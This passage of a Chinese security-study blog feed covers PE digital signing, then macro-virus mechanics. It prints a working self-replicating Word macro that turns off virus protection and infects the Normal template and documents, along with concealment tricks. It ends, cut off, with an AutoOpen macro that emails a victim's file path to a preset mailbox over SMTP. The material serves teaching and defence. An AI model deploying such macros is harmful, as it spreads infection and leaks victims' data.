&quot;CN=名称,E=Email,O=组织名称,C=国家,S=省份,P=县城&quot;</code></li><li>-a：指定散列算法，其值必须是MD5(默认值)或SHA1</li><li>-$：指定证书的签名权限，其值必须是<code>commercial</code>(商业软件)或<code>individual</code>(个人软件)</li><li>-b：证书有效期的开始时间，格式为mm/dd/yyyy</li><li>-e：证书有效期的结束时间，格式为mm/dd/yyyy</li></ul><p>创建过程中需要输入私钥密码，这里设置为“v5le0n9”。</p><img src="/posts/8fb0b0f6/3.1.1.png" class="" title="输入私钥密码"><img src="/posts/8fb0b0f6/3.1.2.png" class="" title="生成两个文件"><p>查看证书信息，如果未信任则需要点击“安装证书”。</p><img src="/posts/8fb0b0f6/3.1.3.png" class="" title="安装证书"><img src="/posts/8fb0b0f6/3.1.4.png" class="" title="安装证书"><p>利用<code>signcode.exe</code>工具进行数字签名，选择需要签名的<code>test.exe</code>程序。</p><img src="/posts/8fb0b0f6/3.1.5.png" class="" title="数字签名"><p>选择自定义选项，然后选择<code>test.cer</code>文件。</p><img src="/posts/8fb0b0f6/3.1.6.png" class="" title="数字签名"><p>点击浏览按钮，添加文件<code>test.PVK</code>。哈希算法可以选MD5也可以选sha1。</p><img src="/posts/8fb0b0f6/3.1.7.png" class="" title="数字签名"><img src="/posts/8fb0b0f6/3.1.8.png" class="" title="数字签名"><p>数据描述可填可不填，时间戳服务器可填可不填，最后弹出签名成功框。</p><img src="/posts/8fb0b0f6/3.1.9.png" class="" title="签名成功"><p>此时<code>test.exe</code>文件完成数字签名，打开该EXE文件属性，可以看到签名相关信息。注意，该数字签名正常且颁发者为Windows。</p><img src="/posts/8fb0b0f6/3.1.10.png" class="" title="数字签名证书"><p>最后使用PEView软件打开PE文件，可以看到签名前和签名后的结构存在<code>CERTIFICATE Table</code>区别。</p><img src="/posts/8fb0b0f6/3.1.11.png" class="" title="数字签名证书"><h1 id="4-PE文件签名数据提取"><a href="#4-PE文件签名数据提取" class="headerlink" title="4. PE文件签名数据提取"></a>4. PE文件签名数据提取</h1><h2 id="4-1-PEView查看签名信息"><a href="#4-1-PEView查看签名信息" class="headerlink" title="4.1 PEView查看签名信息"></a>4.1 PEView查看签名信息</h2><p>使用PEView查看已经签名的<code>test.exe</code>文件，可以看到<code>Certificate Table</code>存储相关签名信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">WIN_CERTIFICATE</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    DWORD dwLength;<span class="comment">//WIN_CERTIFICATE长度</span></span><br><span class="line">    WORD wRevision;<span class="comment">//证书版本号</span></span><br><span class="line">    WORD wCertificateType;<span class="comment">//证书类型</span></span><br><span class="line">    BYTE bCertificate[ANYSIZE_ARRAY];<span class="comment">//SignedData开始位置</span></span><br><span class="line">&#125;WIN_CERTIFICATE, *LPWIN_CERTIFICATE;</span><br></pre></td></tr></table></figure><img src="/posts/8fb0b0f6/4.1.1.png" class="" title="签名信息"><p>文件开始位置：00000A00</p><ul><li>表项长度：4字节，头部字段和签名数据的总长度，这里为0x4A0，所以0xA00+0X4A0-1=0xE9F为签名数据结束的位置</li><li>证书版本：2字节，常见0x0200表示<code>WIN_CERT_REVISION_2</code></li><li>证书类型：2字节，常见0x0002表示包含PKCS#7的<code>SignedData</code>结构</li><li>SignedData：包含PE文件Hash值的签名数据、软件发布者公钥，选用的签名及散列算法等(在文件中为ASN.1编码)</li></ul><p>在PE文件可选文件头<code>DataDirectory</code>第5项查看文件签名信息的偏移及大小以验证上述起始地址与大小是否正确。</p><img src="/posts/8fb0b0f6/4.1.2.png" class="" title="签名信息"><h2 id="4-2-010Editor提取签名数据"><a href="#4-2-010Editor提取签名数据" class="headerlink" title="4.2 010Editor提取签名数据"></a>4.2 010Editor提取签名数据</h2><p>Ctrl + G 定位到0xA00，从第9个字节开始一直复制到0xE9F，另存为<code>test.dat</code>。</p><img src="/posts/8fb0b0f6/4.2.1.png" class="" title="提取签名数据"><img src="/posts/8fb0b0f6/4.2.2.png" class="" title="提取签名数据"><p>此时签名信息成功导出，后续需要进行数据分析。</p><h1 id="5-PE文件签名数据分析"><a href="#5-PE文件签名数据分析" class="headerlink" title="5. PE文件签名数据分析"></a>5. PE文件签名数据分析</h1><p>一个PKCS#7 <code>SignedData</code>结构包括PE文件的哈希值、一个被软件出版厂商的私钥创建的签名 和 将软件出版厂商的签名密钥和法人代表进行绑定的X.509 v3证书。PKCS#7 v1.5规范定义了如下关于<code>SignedData</code>的ASN.1(抽象语法符号)结构：</p><img src="/posts/8fb0b0f6/5.1.1.png" class="" title="ASN.1结构"><p>注意，导出的<code>test.dat</code>签名数据为ASN.1抽象结构，需要采用ASN1View或ASN1Dump进行解析，其效果如下图所示：</p><img src="/posts/8fb0b0f6/5.1.2.png" class="" title="ASN1Dump"><p>用ASN1View导出会出现错误，可能是由于DAT文件后面的5个字节为0，在校验数据大小时出现错误。</p><img src="/posts/8fb0b0f6/5.1.3.png" class="" title="ASN1View"><img src="/posts/8fb0b0f6/5.1.4.png" class="" title="最后5字节为0"><h2 id="5-1-ASN1Dump分析签名数据"><a href="#5-1-ASN1Dump分析签名数据" class="headerlink" title="5.1 ASN1Dump分析签名数据"></a>5.1 ASN1Dump分析签名数据</h2><p>调用ASN1Dump打开<code>test.dat</code>解析基础数据，每个字段都有对应的flag，比如：</p><ul><li><p>指定<code>SignedData</code>结构</p><p>值为1.2.840.113549.1.7.2，表示采用PKCS#7结构</p></li><li><p>生成签名的哈希算法</p><p>MD5：1.2.840.113549.2.5</p><p>SHA1：1.3.14.3.2.26</p><p>SHA256：2.16.840.1.101.3.4.2.1</p></li><li><p>签名属性</p><p>SPC：1.3.6.1.4.1.311.2.1.4</p></li></ul><img src="/posts/8fb0b0f6/5.1.5.png" class="" title="解析基础数据"><p>获取证书颁发者信息，包括md5withRSA签名、证书颁发者、组织、国家及省份。每块数据通常有一个标记变量，标记变量对应有相关值，比如颁发者标记2.5.4.3和颁发者“Windows”、散列算法和散列值等。</p><p>还有其它相关信息，核心数据包括：散列算法、摘要数据、公钥数据、签名后数据。</p><img src="/posts/8fb0b0f6/5.1.6.png" class="" title="其它相关信息"><p>注意，RSA签名后的数据和公钥值会还原出第一个hash值，摘要数据和散列算法将计算第二个hash值。如果两个值一致，则表示该PE文件在传输过程中违背篡改或破坏，且受信任；否则已经被破坏。</p><h2 id="5-2-ASN1View提取证书及分析数据"><a href="#5-2-ASN1View提取证书及分析数据" class="headerlink" title="5.2 ASN1View提取证书及分析数据"></a>5.2 ASN1View提取证书及分析数据</h2><p>回顾<code>test.exe</code>的签名信息和证书信息。PE文件的签名算法是SHA1，加密算法是RSA，证书的签名算法是MD5，加密算法也是RSA。</p><img src="/posts/8fb0b0f6/5.2.1.png" class="" title="PE文件签名"><img src="/posts/8fb0b0f6/5.2.2.png" class="" title="证书签名"><p>使用ASN1View打开<code>test.dat</code>。</p><p>由于ASN1View打开<code>test.dat</code>失败，暂时还无法解决，所以后面的实验暂时做不了。</p><h1 id="6-PE签名文件新增数据"><a href="#6-PE签名文件新增数据" class="headerlink" title="6. PE签名文件新增数据"></a>6. PE签名文件新增数据</h1><p>由于010Editor导入PE模板时出现错误，所以这个实验也做不了。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;在做Android逆向题时就遇到过对APK文件进行签名的题，奇安信面试官跟我说，无论是做哪个平台的逆向，它的大方向、学习路径总是相似的。比如Android逆向有签名、有Hook和注入技术，Windows逆向也是有的。所以这篇笔记就是学习PE文件的数字签名。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>宏病毒攻防机理</title>
    <link href="http://example.com/posts/772b88a4.html"/>
    <id>http://example.com/posts/772b88a4.html</id>
    <published>2022-07-02T05:54:02.122Z</published>
    <updated>2022-07-07T08:27:18.666Z</updated>
    
    <content type="html"><![CDATA[<p>宏病毒是Windows平台病毒中的一类，它是一种寄存在文档或模板的宏中的计算机病毒。一旦打开这样的文档，其中的宏就会被执行，于是宏病毒就会被激活，转移到计算机上，并驻留在Normal模板上。从此以后，所有自动保存的文档都会“感染”上这种宏病毒，而且如果其他用户打开了感染病毒的文档，宏病毒又会转移到他的计算机上。</p><span id="more"></span><h1 id="1-宏"><a href="#1-宏" class="headerlink" title="1. 宏"></a>1. 宏</h1><h2 id="1-1-基本概念"><a href="#1-1-基本概念" class="headerlink" title="1.1 基本概念"></a>1.1 基本概念</h2><p>宏是一种批量处理的称谓，是指能组织到一起作为独立的命令使用的一系列Word命令，可以实现任务执行的自动化，简化日常的工作。Microsoft Office使用Visual Basic for Applications(VBA)进行宏的编写。</p><p>注意，在Office中可以直接使用Word的宏函数，而WPS需要安装VBA for WPS后才能使用。</p><h2 id="1-2-创建宏"><a href="#1-2-创建宏" class="headerlink" title="1.2 创建宏"></a>1.2 创建宏</h2><img src="/posts/772b88a4/1.2.1.png" class="" title="创建宏"><p>代码示例如下：</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Sub</span> test()</span><br><span class="line"><span class="comment">&#x27;</span></span><br><span class="line"><span class="comment">&#x27; test Macro</span></span><br><span class="line"><span class="comment">&#x27;</span></span><br><span class="line">    <span class="keyword">Dim</span> sLineNum3 <span class="keyword">As</span> <span class="type">String</span>     <span class="comment">&#x27;行号(文字)</span></span><br><span class="line">    <span class="keyword">Dim</span> nLineNum                <span class="comment">&#x27;行号(数值)</span></span><br><span class="line">    <span class="keyword">Dim</span> i <span class="keyword">As</span> <span class="type">Long</span></span><br><span class="line"> </span><br><span class="line">    Title = <span class="string">&quot;输入编号信息&quot;</span></span><br><span class="line">    a1 = <span class="string">&quot;请输入总编号开始号：&quot;</span></span><br><span class="line">    b1 = InputBox(a1, Title)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure><img src="/posts/772b88a4/1.2.2.png" class="" title="创建宏"><p>运行宏函数，弹出界面：</p><img src="/posts/772b88a4/1.2.3.png" class="" title="运行宏函数"><img src="/posts/772b88a4/1.2.4.png" class="" title="运行宏函数"><h2 id="1-3-录制宏"><a href="#1-3-录制宏" class="headerlink" title="1.3 录制宏"></a>1.3 录制宏</h2><p>宏的默认安全性非常高，于是会导致宏程序不会自动执行，我们可以修改降低其安全性。</p><p>假设我们现在有这样一个需求，将文档中的内容隐藏，该怎么做呢？传统方法是全选内容(Ctrl + A)，右键 -&gt; 字体(Ctrl + D)，勾选隐藏。</p><img src="/posts/772b88a4/1.2.5.png" class="" title="内容隐藏"><p>会将所选内容隐藏，包括图片。如果需要显示，则将隐藏选项取消勾选即可。</p><p>这些小技巧往往会隐藏在病毒或木马中。那么我们是否可以将这隐藏和还原两个操作用两个快捷键关联起来呢？下次再进行相关操作时，会更加方便简洁。</p><p>录制一个新宏<code>MacroHide</code>隐藏内容，快捷键为Ctrl + Shift + H。</p><img src="/posts/772b88a4/1.3.2.png" class="" title="录制新宏"><img src="/posts/772b88a4/1.3.3.png" class="" title="录制新宏"><p>同样操作，再录制一个新宏<code>MacroShow</code>还原，快捷键为Ctrl + Shift + S。</p><img src="/posts/772b88a4/1.3.1.png" class="" title="录制新宏"><p>此时，当我们按下Ctrl + Shift + H将所有内容隐藏，按下Ctrl + Shift + S所有内容显示。</p><h1 id="2-宏病毒"><a href="#2-宏病毒" class="headerlink" title="2. 宏病毒"></a>2. 宏病毒</h1><h2 id="2-1-基础知识"><a href="#2-1-基础知识" class="headerlink" title="2.1 基础知识"></a>2.1 基础知识</h2><p>宏病毒是一种寄存在文档或模板的宏中的计算机病毒，存在于数据文件或模板中(字处理文档、数据表格、数据库、演示文档等)，使用宏语言编写，利用宏语言的功能将自己寄生到其它数据文档。</p><p>最早的时候，人们认为数据文档是不可能带有病毒的，因为数据文档不包含指令，知道宏病毒出现才令大家改观。当我们打开带有宏病毒的文档，其中的宏就会被执行，宏病毒被激活，转移到计算机上，并驻留在Normal模板上。从此以后，所有自动保存的文档都会感染上这种宏病毒，而且如果其他用户打开了感染病毒的文档，宏病毒又会转移到他的计算机上。</p><p>那么，宏病毒如何获得控制权呢？只有拿到控制权之后宏病毒才能进行传播，它和Office的特性相关。Office支持一些自动执行的宏，如果将病毒代码放到自动执行的宏中，Word打开时会给病毒传播创造条件。利用自动执行宏将病毒代码写在宏汇中，由于这些宏会自动执行，从而获取控制权。</p><ol><li>Word<ul><li>AutoOpen：打开Word文档</li><li>AutoClose：关闭Word文档</li><li>AutoExec：打开Word程序</li><li>AutoExit：退出Word程序</li><li>AutoNew：新建宏</li></ul></li><li>Excel<ul><li>Auto_Open</li><li>Auto_Close</li><li>Auto_Activate</li><li>Auto_Deactivate</li></ul></li><li>Office97/2000<ul><li>Document_Open</li><li>Document_Close</li><li>Document_New</li></ul></li></ol><h2 id="2-2-自动宏案例"><a href="#2-2-自动宏案例" class="headerlink" title="2.2 自动宏案例"></a>2.2 自动宏案例</h2><p>我们通过VB编辑器增加宏代码，定义了五个自动宏。</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Sub</span> AutoOpen()</span><br><span class="line">  MsgBox <span class="string">&quot;您好，您打开了Word文档！&quot;</span>, <span class="number">0</span>, <span class="string">&quot;宏病毒测试&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> AutoExec()</span><br><span class="line">  MsgBox <span class="string">&quot;您好，您打开了Word程序！&quot;</span>, <span class="number">0</span>, <span class="string">&quot;宏病毒测试&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> AutoNew()</span><br><span class="line">  MsgBox <span class="string">&quot;您好，您选择了新建文件！&quot;</span>, <span class="number">0</span>, <span class="string">&quot;宏病毒测试&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> AutoExit()</span><br><span class="line">  MsgBox <span class="string">&quot;欢迎下次光临！&quot;</span>, <span class="number">0</span>, <span class="string">&quot;宏病毒测试&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> AutoClose()</span><br><span class="line">  MsgBox <span class="string">&quot;下次还要来哦！&quot;</span>, <span class="number">0</span>, <span class="string">&quot;宏病毒测试&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">Sub</span> MyFirstVBAProcedure()</span><br><span class="line">    <span class="keyword">Dim</span> NormProj</span><br><span class="line">    MsgBox <span class="string">&quot;欢迎光临V5LE0N9安全实验室！&quot;</span>, <span class="number">0</span>, <span class="string">&quot;宏病毒测试&quot;</span></span><br><span class="line">    <span class="keyword">Set</span> NormProj = NormalTemplate.VBProject</span><br><span class="line">    MsgBox NormProj.Name, <span class="number">0</span>, <span class="string">&quot;模块文件名&quot;</span>    <span class="comment">&#x27;显示模板文件的名字</span></span><br><span class="line">    <span class="keyword">With</span> Assistant.NewBalloon           <span class="comment">&#x27;调出助手</span></span><br><span class="line">        .Icon = msoIconAlert</span><br><span class="line">        .Animation = msoAnimationGetArtsy</span><br><span class="line">        .Heading = <span class="string">&quot;Attention，Please!&quot;</span></span><br><span class="line">        .<span class="keyword">Text</span> = <span class="string">&quot;Today I turn into a martian!&quot;</span></span><br><span class="line">        .Show</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">With</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure><img src="/posts/772b88a4/2.2.1.png" class="" title="编写自动宏"><p>当关闭Word程序时，首先关闭Word文档，再关闭Word程序。</p><img src="/posts/772b88a4/2.2.2.png" class="" title="显示结果"><img src="/posts/772b88a4/2.2.3.png" class="" title="显示结果"><p>当运行<code>MyFirstVBAProcedure</code>宏时，弹出提示框后出现错误：</p><img src="/posts/772b88a4/2.2.4.png" class="" title="出现错误"><img src="/posts/772b88a4/2.2.5.png" class="" title="出现错误"><p>暂时不知道怎么解决。</p><h2 id="2-3-宏病毒感染"><a href="#2-3-宏病毒感染" class="headerlink" title="2.3 宏病毒感染"></a>2.3 宏病毒感染</h2><p>在Word和其它微软Office系列办公软件中，宏分为两种：</p><ul><li>内建宏：局部宏，位于文档中，对该文档有效，如打开文档(AutoOpen)、保存、打印、关闭等</li><li>全局宏：位于Office模板中，为所有文档所共用，如打开Word程序(AutoExec)</li></ul><p>宏病毒的传播路线如下：</p><ul><li>单机：单个Office文档 -&gt; Office文档模板 -&gt; 多个Office文档(文档到模块感染)</li><li>网络：电子邮件居多</li></ul><p>宏病毒感染流程：首先Office文档被感染病毒，当文档打开会执行自动宏，如果宏被执行，它会去检测当前模板是否被感染病毒。如果没有被感染，它将释放自身的病毒代码。当模板被感染之后，系统中任何一个文档被打开，都会执行模板中的病毒，宏病毒进行传播。</p><p>宏病毒的感染方案就是让宏在数据文档和文档模板之间互相感染。</p><img src="/posts/772b88a4/2.3.1.png" class="" title="宏病毒的感染方案"><p>完整代码如下：</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Sub</span> test()</span><br><span class="line">    <span class="comment">&#x27;On Error Resume Next</span></span><br><span class="line">    Application.DisplayAlerts = wdAlertsNone</span><br><span class="line">    Application.EnableCancelKey = wdCancelDisabled</span><br><span class="line">    Application.DisplayStatusBar = <span class="literal">False</span></span><br><span class="line">    Options.VirusProtection = <span class="literal">False</span></span><br><span class="line">    Options.SaveNormalPrompt = <span class="literal">False</span>        <span class="comment">&#x27;以上是病毒基本的自我保护措施</span></span><br><span class="line">    <span class="keyword">Set</span> Doc = ActiveDocument.VBProject.VBComponents</span><br><span class="line">    <span class="comment">&#x27;取当前活动文档中工程组件集合</span></span><br><span class="line">    <span class="keyword">Set</span> Tmp = NormalTemplate.VBProject.VBComponents</span><br><span class="line">    <span class="comment">&#x27;取Word默认模板中工程组件集合</span></span><br><span class="line">    <span class="keyword">Const</span> ExportSource = <span class="string">&quot;c:\jackie.sys&quot;</span></span><br><span class="line">    <span class="keyword">Const</span> VirusName = <span class="string">&quot;AIGTMV1&quot;</span>               <span class="comment">&#x27;该字符串相当于一个病毒感染标志</span></span><br><span class="line">    Application.VBE.ActiveVBProject.VBComponents(VirusName).Export ExportSource</span><br><span class="line">                                 <span class="comment">&#x27;将当前病毒代码导出到c:\jackie.sys文件保存</span></span><br><span class="line">                                 </span><br><span class="line">    <span class="keyword">For</span> i = <span class="number">1</span> <span class="keyword">To</span> Tmp.Count</span><br><span class="line">        <span class="keyword">If</span> Tmp(i).Name = VirusName <span class="keyword">Then</span> TmpInstalled = <span class="number">1</span></span><br><span class="line">     <span class="comment">&#x27;检查模板是否已经被感染病毒</span></span><br><span class="line">    <span class="keyword">Next</span> i</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">For</span> j = <span class="number">1</span> <span class="keyword">To</span> Doc.Count</span><br><span class="line">        <span class="keyword">If</span> Doc(j).Name = VirusName <span class="keyword">Then</span> DocInstalled = <span class="number">1</span></span><br><span class="line">                                     <span class="comment">&#x27;检查当前活动文档是否已被感染病毒</span></span><br><span class="line">    <span class="keyword">Next</span> j</span><br><span class="line">    <span class="keyword">If</span> TmpInstalled = <span class="number">0</span> <span class="keyword">Then</span>                 <span class="comment">&#x27;如果模板没有被感染，对其进行感染</span></span><br><span class="line">        Tmp.Import ExportSource              <span class="comment">&#x27;从c:\jackie.sys将病毒导入模板</span></span><br><span class="line">        NormalTemplate.Save                  <span class="comment">&#x27;自动保存模板，以免引起用户怀疑</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    <span class="keyword">If</span> DocInstalled = <span class="number">0</span> <span class="keyword">Then</span>                 <span class="comment">&#x27;如果当前活动文档没有被感染</span></span><br><span class="line">        Doc.Import ExportSource              <span class="comment">&#x27;从c:\jackie.sys将病毒导入当前活动文档</span></span><br><span class="line">        ActiveDocument.SaveAs ActiveDocument.FullName <span class="comment">&#x27;自动保存当前活动文档</span></span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">If</span></span><br><span class="line">    MsgBox <span class="string">&quot;Word instructional macro by jackie&quot;</span>, <span class="number">0</span>, <span class="string">&quot;Word.APMP&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure><p>宏病毒也可以通过网络进行传播，例如电子邮件。</p><ul><li>Mellisa病毒：自动往OutLook邮件用户地址簿中的前50位用户发送病毒副本</li><li>“叛逃者”病毒：集成了感染Office文档的宏病毒感染功能，并且可以通过OutLook发送病毒副本</li></ul><img src="/posts/772b88a4/2.3.2.png" class="" title="通过电子邮件传播"><h1 id="3-宏病毒的自我保护与防御"><a href="#3-宏病毒的自我保护与防御" class="headerlink" title="3. 宏病毒的自我保护与防御"></a>3. 宏病毒的自我保护与防御</h1><p>宏病毒的自我保护主要包括三种方法：</p><ol><li><p>禁止提示信息</p><p>On Error Resume Next 如果发生错误，不弹出出错窗口，继续往下执行语句</p><p>Application.DisplayAlerts = wdAlertsNone 不弹出警告窗口</p><p>Application.DisplayStatusBar = False 不显示状态栏，以免显示宏的运行状态</p><p>Options.VirusProtection = False 关闭病毒保护功能，运行前如果包含宏，不提示</p><p>…</p></li><li><p>屏蔽命令菜单，不允许查看宏</p><ul><li><p>通过特定宏定义</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Sub</span> ViewVBCode()</span><br><span class="line">    MsgBox <span class="string">&quot;Unexcpected error&quot;</span>,<span class="number">16</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure><p><code>ViewCode</code>过程和<code>ViewVBCode</code>函数一样，如果用户按工具栏上的小图标就会执行这个过程。</p></li><li><p>Disable或删除特定菜单项</p><p>用来使“视图 -&gt; 宏”菜单失效的语句</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CommandBars(<span class="string">&quot;Tools&quot;</span>).Controls(<span class="number">16</span>).Enabled = <span class="literal">False</span></span><br></pre></td></tr></table></figure></li></ul></li><li><p>隐藏宏的真实病毒代码</p><p>在自动宏中，不包括任何感染或破坏的代码，但包含了创建、执行和删除新宏(实际进行感染和破坏的宏)的代码，将宏代码字体颜色设置成与背景一样的白色等</p></li></ol><p>宏病毒的防御措施包括：</p><ul><li>一旦发现计算机Office软件打开后弹出系统警告框，并且无法“另存为”，就表示该文件已感染宏病毒，此时不能再打开其它文件，否则其它文件也会被感染，应马上关闭删除该文件。若文件重要不能删除，则需用杀毒软件全盘扫描，处理感染文件。</li><li>开启禁用宏进行防止再次感染病毒。在“受信任位置”中，删除“可靠来源”列表框中的不安全来源，根据实际情况设置是否信任所有安装的加载项和模板，设置宏的安全性。</li><li>安装杀毒软件，打全系统补丁是预防计算机病毒的基本措施，当然也适用于宏病毒。除此之外，宏病毒还有专门的防治措施。</li><li>在线沙箱检测文档是否包含宏病毒。</li></ul><h1 id="4-案例：CDO自发邮箱"><a href="#4-案例：CDO自发邮箱" class="headerlink" title="4. 案例：CDO自发邮箱"></a>4. 案例：CDO自发邮箱</h1><p>接下来我们制作一个宏，当对方打开文档时就知道该文档在对方电脑存储的具体路径。常见方法包括：</p><ul><li>邮件组件，如CDO组件</li><li>远程脚本</li></ul><p>这里采用CDO自发邮件实现。通过Word VB编写脚本，设置文档打开时运行，利用CDO发送电子邮件将文件的路径和名字发送到指定邮箱中。具体步骤如下：</p><ol><li>利用<code>AutoOpen</code>执行并打开文档时运行</li><li>利用<code>WordObj.ActiveDocument</code>获取文件信息</li><li>利用CDO实现电子邮件信息传递</li></ol><p>注意，千万别小瞧这个功能，如果是一封钓鱼邮件或运行宏病毒自动采集个人电脑信息发送至指定邮箱，其危害性非常大，而且该攻击手段广泛存在于许多亚洲攻击组织中。</p><p>新建宏函数<code>AutoOpen</code>，核心代码如下：</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Sub</span> AutoOpen()</span><br><span class="line"><span class="comment">&#x27; AutoOpen宏</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; 获取文件夹路径</span></span><br><span class="line">    <span class="keyword">Dim</span> WordObj <span class="keyword">As</span> <span class="type">Object</span></span><br><span class="line">    <span class="keyword">Dim</span> Doc <span class="keyword">As</span> <span class="type">Object</span></span><br><span class="line">    <span class="keyword">Set</span> WordObj = GetObject(, <span class="string">&quot;Word.Application&quot;</span>)</span><br><span class="line">    <span class="keyword">Set</span> Doc = WordObj.ActiveDocument</span><br><span class="line">    MsgBox (Doc.Path)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; 定义邮件地址</span></span><br><span class="line">    <span class="keyword">Const</span> from1 = <span class="string">&quot;152xxxxxxxx@163.com&quot;</span></span><br><span class="line">    <span class="keyword">Const</span> to1 = <span class="string">&quot;xxxxxxxxxx@qq.com&quot;</span></span><br><span class="line">    <span class="keyword">Const</span> password = <span class="string">&quot;xxxxxxxxxx&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; 添加CDO库</span></span><br><span class="line">    <span class="keyword">Set</span> CDO = CreateObject(<span class="string">&quot;CDO.Message&quot;</span>)</span><br><span class="line">    CDO.<span class="keyword">from</span> = from1</span><br><span class="line">    CDO.<span class="keyword">to</span> = to1</span><br><span class="line">    CDO.Subject = Doc.Name</span><br><span class="line">    CDO.Textbody = Doc.Path</span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; 微软服务器网址</span></span><br><span class="line">    MsgBox (<span class="string">&quot;发送邮件&quot;</span>)</span><br><span class="line">    <span class="keyword">Const</span> proxyUrl = <span class="string">&quot;http://schemas.microsoft.com/cdo/configuration/&quot;</span></span><br><span class="line">    <span class="keyword">With</span> CDO.Configuration.Fields</span><br><span class="line">        .Item(proxyUrl &amp; <span class="string">&quot;sendusing&quot;</span>) = <span class="number">2</span>                     <span class="comment">&#x27;发送端口</span></span><br><span class="line">        .Item(proxyUrl &amp; <span class="string">&quot;smtpserver&quot;</span>) = <span class="string">&quot;smtp.163.com&quot;</span>       <span class="comment">&#x27;SMTP服务器地址</span></span><br><span class="line">        .Item(proxyUrl &amp; <span class="string">&quot;smtpserverport&quot;</span>) = <span 